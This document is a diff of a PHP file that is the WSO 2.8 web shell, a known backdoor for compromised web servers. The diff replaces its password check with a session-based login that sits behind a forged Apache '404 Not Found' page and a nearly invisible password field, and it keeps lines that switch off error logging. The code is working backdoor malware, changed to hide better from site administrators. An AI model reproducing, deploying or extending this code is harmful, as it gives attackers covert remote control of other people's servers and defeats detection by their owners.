@@ -1,5 +1,5 @@
 <?php
-$auth_pass = "a727563903d3000164c58f515fb96a52";
+$pass = md5("pw");
 $color = "#df5";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
@@ -12,6 +12,33 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
         exit;
     }
 }
+
+if ($pass) {
+    if ($action == 'login') {
+        if ($pass == md5($password)) {
+            $_SESSION[$prefixme.'loginpass'] = md5($password);
+            $action = 'file';
+        }
+    }
+    if ($_SESSION[$prefixme.'loginpass']) {
+        if ($_SESSION[$prefixme.'loginpass'] != $pass) {
+        		unset($_SESSION[$prefixme.'loginpass']);
+    				unset($_SESSION[$prefixme.'charsetpage']);
+    				unset($_SESSION[$prefixme.'showupdate']);
+    				unset($_SESSION[$prefixme.'updateready']);
+    				session_destroy();
+            loginpage($adaptiveerrorpage);
+        }
+    } else {
+    		unset($_SESSION[$prefixme.'loginpass']);
+    		unset($_SESSION[$prefixme.'charsetpage']);
+   		 	unset($_SESSION[$prefixme.'showupdate']);
+   		 	unset($_SESSION[$prefixme.'updateready']);
+   			session_destroy();
+        loginpage($adaptiveerrorpage);
+    }
+}
+
  
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
@@ -20,28 +47,30 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 @set_magic_quotes_runtime(0);
 @define('WSO_VERSION', '2.8');
  
- function printLogin() { 
-    ?> 
-<h1>Not Found</h1> 
-<p>The requested URL was not found on this server.</p> 
-<hr> 
-<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
-    <style> 
-        input { margin:0;background-color:#fff;border:1px solid #fff; } 
-    </style> 
-    <center> 
-    <form method=post> 
-    <input type=password name=pass> 
-    </form></center> 
-    <?php 
-    exit; 
-} 
-if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-	if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
-		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-	else
-		printLogin();
-		
+ function loginpage($aep)
+{
+    $epage = $aep ? geterrorpage() : "";
+    if ($epage == "") {
+        echo '<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ' . $_SERVER['PHP_SELF'] . ' was not found on this server.</p><hr>';
+        if ($_SERVER["SERVER_SIGNATURE"] != ""){
+        echo $_SERVER["SERVER_SIGNATURE"];
+        }else{
+        echo '<address>' . $_SERVER['SERVER_SOFTWARE'] . ' Server at ' . $_SERVER['HTTP_HOST'] . ' Port 80</address>';
+        }
+    } else {
+        echo $epage;
+    }
+    echo '<style>
+		input { margin:0;background-color:transparent;border:0px solid #fff; }
+	</style>
+	<center>
+	<form method="post" onSubmit="window.onbeforeunload = null;">
+	<input type="password" name="password">
+	<input type="hidden" name="action" value="login">
+	</form></center>';
+    exit;
+}
+
 if(get_magic_quotes_gpc()) {
     function WSOstripslashes($array) {
         return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array);
